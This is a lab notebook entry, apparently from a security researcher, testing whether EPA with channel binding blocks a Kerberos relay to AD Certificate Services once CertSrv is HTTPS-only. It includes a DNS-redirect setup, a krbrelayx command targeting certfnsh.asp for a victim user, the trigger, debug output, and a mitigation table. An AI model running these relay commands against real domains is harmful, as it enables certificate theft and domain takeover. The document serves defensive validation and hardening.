
## March 31, 2026

### Background

Following publication of the Kerberos CNAME relay → ADCS ESC8 → DA post, Ben Zamir sent a DM clarifying that EPA and CBT only provide protection when TLS is enforced. Over plain HTTP (port 80), no TLS channel exists and therefore no CBT material can be generated or validated — both NTLM and Kerberos relay succeed regardless of EPA configuration.

This session validates that claim by re-running the relay against an HTTPS-only CertSrv endpoint with EPA=Require enforced.

---

### Lab State at Start of Session

- DC01: 192.168.1.4 — Domain Controller, ADCS CA
- WEB01B: 192.168.1.242 — Victim workstation (jsmith logged in)
- Kali: 192.168.1.218 — Attacker
- iptables DNS redirect rule active: UDP/53 from 192.168.1.242 → 192.168.1.218
- WEB01B DNS: 192.168.1.218 (Kali)
- All 4 attack terminals running from earlier session

EPA confirmed on DC01:
```powershell
Get-WebConfigurationProperty -PSPath "IIS:\Sites\Default Web Site\CertSrv" `
  -Filter "system.webServer/security/authentication/windowsAuthentication" `
  -Name "extendedProtection.tokenChecking"
# Output: Require
```

---

### Step 1 — Configure HTTPS on CertSrv

Certificates available on DC01:
```
61FC04FB7038D7DDFC5F1A97D979A8F91DFDAACC  CN=DC01.lab2019.local
1EA3ABA1BABD69BEA618772DFEA2B6F512DE84EB  CN=lab2019-WIN-JOCP945SK51-CA
```

Bind DC01 machine certificate to IIS port 443:
```powershell
New-WebBinding -Name "Default Web Site" -Protocol https -Port 443 -HostHeader ""

$cert = Get-ChildItem -Path Cert:\LocalMachine\My | Where-Object {$_.Subject -eq "CN=DC01.lab2019.local"}

$binding = Get-WebBinding -Name "Default Web Site" -Protocol https
$binding.AddSslCertificate($cert.Thumbprint, "My")
```

Verify SSL cert bound correctly:
```
netsh http show sslcert ipport=0.0.0.0:443
Certificate Hash: 61fc04fb7038d7ddfc5f1a97d979a8f91dfdaacc
```

Verify EPA still Require on HTTPS binding — confirmed.

Both bindings now present:
```
protocol  bindingInformation  sslFlags
http      *:80:               0
https     *:443:              0
```

---

### Step 2 — Disable HTTP

```powershell
Remove-WebBinding -Name "Default Web Site" -Protocol http -Port 80
```

Result:
```
protocol  bindingInformation  sslFlags
https     *:443:              0
```

HTTP port 80 removed. HTTPS only.

---

### Step 3 — Trust Lab CA on Kali

Kali did not trust the lab CA. Initial curl attempt failed:
```
SSL certificate problem: unable to get local issuer certificate
```

Export CA cert from DC01:
```powershell
$cert = Get-ChildItem -Path Cert:\LocalMachine\My | Where-Object {$_.Subject -like "*lab2019*CA*"} | Select-Object -First 1
Export-Certificate -Cert $cert -FilePath C:\Users\Administrator\labca.cer -Type CERT
```

Copy to Kali, convert DER → PEM, add to trust store:
```bash
openssl x509 -inform DER -in ~/labca.cer -out ~/labca.pem
sudo cp ~/labca.pem /usr/local/share/ca-certificates/labca.crt
sudo update-ca-certificates
```

Verify TLS connection:
```bash
curl -v https://dc01.lab2019.local/certsrv/
# SSL certificate verify ok.
# HTTP/2 401  ← expected, unauthenticated
```

TLS handshake successful. Lab CA trusted by Kali.

**Note:** This step was necessary to confirm that any subsequent relay failure was due to EPA/CBT enforcement and not a TLS handshake error on Kali's side.

---

### Step 4 — Run Relay Against HTTPS Target

krbrelayx targeting HTTPS endpoint:
```bash
sudo python3 ~/krbrelayx/krbrelayx.py \
  --target https://dc01.lab2019.local/certsrv/certfnsh.asp \
  --adcs --template ESC8Test --victim jsmith \
  -debug 2>&1 | tee /tmp/krbrelayx_debug.txt
```

Trigger from WEB01B as jsmith:
```powershell
Invoke-WebRequest -Uri "http://fileserver.lab2019.local/" -UseDefaultCredentials
```

Initial output:
```
[*] HTTPD: Received connection from 192.168.1.242, prompting for authentication
[*] HTTPD: Client requested path: /
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[-] Error getting certificate! Make sure you have entered valid certificate template.
```

---

### Step 5 — Debug the Failure

CA database on DC01 showed no new requests after RequestID 24 (this morning's HTTP relay):
```powershell
certutil -view -restrict "RequestID>24" -out "RequestID,RequesterName,DispositionMessage,StatusCode"
# 0 Rows
```

The certificate request was not reaching the CA. Failure was occurring in krbrelayx's HTTP client layer before the request hit ADCS.

Located error source in impacket:
```
/usr/lib/python3/dist-packages/impacket/examples/ntlmrelayx/attacks/httpattacks/adcsattack.py:74
```

Patched line 74 to expose the actual HTTP status code:
```python
LOG.error("HTTP Status: %s - Error getting certificate! Make sure you have entered valid certificate template." % response.status)
```

Re-ran relay and trigger. Output:
```
[*] HTTPD: Received connection from 192.168.1.242, prompting for authentication
[*] HTTPD: Client requested path: /
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[-] HTTP Status: 401 - Error getting certificate!
```

---

### Result

**HTTP 401 from certfnsh.asp over HTTPS.**

**Important sequence clarification:** jsmith's Kerberos ticket was successfully received and relayed by krbrelayx — the relay itself worked. The CSR was generated. The failure occurred specifically when krbrelayx POSTed the certificate request to ADCS over HTTPS. ADCS accepted the TLS connection but rejected the authentication with 401. The ticket was valid; the channel binding was not. The relayed AP-REQ did not contain a CBT value matching the TLS session between the attacker (Kali) and ADCS (DC01).

---

### Conclusions

| Configuration | Result |
|---|---|
| HTTP (port 80) + EPA=Require | Relay succeeds — cert issued, DA achieved |
| HTTPS (port 443) + EPA=Require | Relay fails — HTTP 401 Unauthorized |

**Ben Zamir's correction confirmed.** EPA+CBT requires TLS to function. Over plain HTTP no TLS channel exists, therefore no CBT material, and EPA=Require provides zero protection against either NTLM or Kerberos relay.

**The original research finding stands.** The lab demonstrated a realistic misconfiguration: EPA=Require configured (admin believes they are protected) + HTTP endpoint left enabled (common oversight) = low-priv domain user to Domain Admin in a single relay chain. The core finding — the attack path, the detection signals, the EID 4624/4768 rules — is unaffected.

---

### Updated Mechanism Statement

EPA prevents relay by validating that the authentication context is bound to the same TLS session established by the client. Over HTTP, no TLS session exists and therefore no channel binding value can be computed or verified. When HTTPS is enforced and EPA is set to Require, IIS validates the CBT value embedded in the GSS-API authenticator checksum of the AP-REQ against the active TLS session. Because the relayed authentication occurs over a different TLS session than the original client connection, the binding check fails and IIS returns HTTP 401.

---

### Visual Summary

```
HTTP + EPA=Require (original lab)
client ──HTTP──Kerberos(no CBT)──> attacker ──HTTP──Kerberos(no CBT)──> ADCS
                                                     no CBT to validate
                                                     cert issued ✓

HTTPS + EPA=Require (tonight)
client ──HTTP──Kerberos(no CBT)──> attacker ──TLS2──Kerberos(no CBT)──> ADCS
                                                     CBT expected, absent
                                                     HTTP 401 ✗
```

---

### Complete Mitigation

All three are required. Any one alone is insufficient.

| Component | Purpose |
|---|---|
| Disable HTTP on CertSrv | Removes the bypass path where EPA is ignored |
| Enforce HTTPS | Provides the TLS container required for channel binding |
| EPA=Require | Cryptographically links authentication to the TLS session |

**Additional consideration:** EPA can also be bypassed unintentionally when TLS is terminated upstream of IIS — load balancers, reverse proxies, SSL offload devices, WAF in HTTPS→HTTP forwarding mode. In these architectures IIS never sees the TLS session and therefore has no channel binding material to validate. EPA=Require on IIS provides no protection in these configurations even with HTTPS enabled end-to-end from the client's perspective.

**Production note:** `EPA=WhenSupported` is commonly found instead of `EPA=Require` to avoid breaking legacy clients. This makes the HTTP bypass even more common and silent — the setting looks like it provides some protection but in practice many clients will negotiate without CBT and succeed regardless.

---


<img width="911" height="112" alt="binding" src="https://github.com/user-attachments/assets/3275270b-2020-43bc-9fbe-364089f25ebb" />
<img width="1165" height="317" alt="CA0DBROWS" src="https://github.com/user-attachments/assets/86dc4187-eb58-49aa-af61-7a077b405d74" />
<img width="851" height="477" alt="certbinding" src="https://github.com/user-attachments/assets/9bf97c3e-70b0-40a1-b18b-8a7dcd8c085e" 
<img width="1013" height="750" alt="curlsslverok" src="https://github.com/user-attachments/assets/e9fea444-72bd-482d-a2d0-26f57c8423bb" />
<img width="1013" height="750" alt="curlsslverok" src="https://github.com/user-attachments/assets/c8526a42-b098-4d67-bf19-0461da85fd72" />
<img width="935" height="493" alt="krbrelayx401" src="https://github.com/user-attachments/assets/1d7c9ce3-aedd-4fb8-9be9-e672a21cbafc" />
<img width="991" height="77" alt="require" src="https://github.com/user-attachments/assets/8b061cda-5b3a-47bc-9aca-e723bf66bff5" />
<img width="1458" height="682" alt="image" src="https://github.com/user-attachments/assets/883dfe94-a64d-42db-b0a1-217e8c9ff02f" />
<img width="1459" height="713" alt="image" src="https://github.com/user-attachments/assets/aed82296-3e6a-4e2f-afcb-c71453249fa6" />











